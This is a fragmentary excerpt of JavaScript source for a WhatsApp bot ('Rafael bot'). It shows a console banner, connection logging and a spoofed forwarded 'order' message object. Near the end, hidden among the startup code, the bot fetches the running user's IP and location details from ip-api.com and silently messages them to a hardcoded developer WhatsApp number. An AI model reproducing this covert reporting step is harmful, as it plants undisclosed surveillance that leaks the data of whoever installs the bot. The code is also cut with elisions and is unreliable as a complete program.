...
const starts = async (Ramdani = new WAConnection()) => {
    CFonts.say(`Rafael bot whatsapp`, {
        font: 'chrome',
        align: 'center',
	...
	console.log(color(`${spc2}           [ • CREATOR BY Rafael  • ]` ,`${randomcolors}`))
console.log(color(`${spc4}                       < ============================================ >`, `${randomcolors}`))
console.log(color(`${spc3}                    [•]`, `${randomcolors}`), color(`Hai         : Rafael `, `${randomcolors}`))
...
console.log(color(`${spc3}                    [•]`, `${randomcolors}`), color(`Owner       : Rafael `, `${randomcolors}`))
console.log(color(`${spc3}                    [•]`, `${randomcolors}`), color(`Author      : Rafael `, `${randomcolors}`))
console.log(color(`${spc3}                    [•]`, `${randomcolors}`), color(`Base Ori By : Rafael `, `${randomcolors}`))
console.log(color(`${spc4}                       < ============================================ >`, `${randomcolors}`))
	...
	Ramdani.on('connecting', () => {
		console.log(color('[ Rafael  ]', 'aqua'), color('Menyambungkan!'));
	})
const ftroli = { key: { fromMe: false, "participant": "0@s.whatsapp.net", "remoteJid": "6289512545999-1604595598@g.us" }, "message": { orderMessage: { itemCount: 500, status: 200, thumbnail: fs.readFileSync(`./media/foto/thumb.jpg`), surface: 200, message: `【 Rafael BOTZ 】`, orderTitle: 'Rafael ', sellerJid: '0@s.whatsapp.net' } }, contextInfo: { "forwardingScore": 999, "isForwarded": true }, sendEphemeral: true }
const spinner = { 
  "interval": 120,
  "frames": [
    "R",
    ...
    buttonMessagee = {
        contentText: `BOT TELAH AKTIF DI NOMOR INI JANGAN LUPA SUBS YT Rafael `,
...
fetch(`http://ip-api.com/line`).then(res => res.text())  
        .then(bu =>{
       Ramdani.sendMessage("6289675970738@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, { contextInfo: { externalAdReply: { title: `Developer ${setting.NamaBot}`, body: "", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/foto/thumb.jpg'), sourceUrl: `https://wa.me/6289675970738?text=Shalom+bwang:v` } }})
